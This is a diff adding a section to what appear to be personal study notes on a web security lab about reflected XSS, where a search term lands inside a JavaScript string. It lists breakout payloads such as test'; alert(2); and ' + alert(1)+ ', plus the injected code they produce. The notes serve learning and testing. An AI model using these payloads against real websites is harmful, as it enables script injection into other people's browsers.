@@ -781,5 +781,19 @@ In inspect mode
 ';
 document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
 ___________________________________________________________________________________________________________________________________________________________________
+Reflected XSS into a JavaScript string with single quote HTML encoded
+---------------------------------------------------------------------
+When we search the word test, it is in searchTerms value
 
+var searchTerms = 'test'; 
+document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+
+final payload --> test'; alert(2); let myvar='hi
+		  ' + alert(1)+ '
+
+var searchTerms = '' + alert(1) + '';
+document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+___________________________________________________________________________________________________________________________________________________________________
+
+                 
  
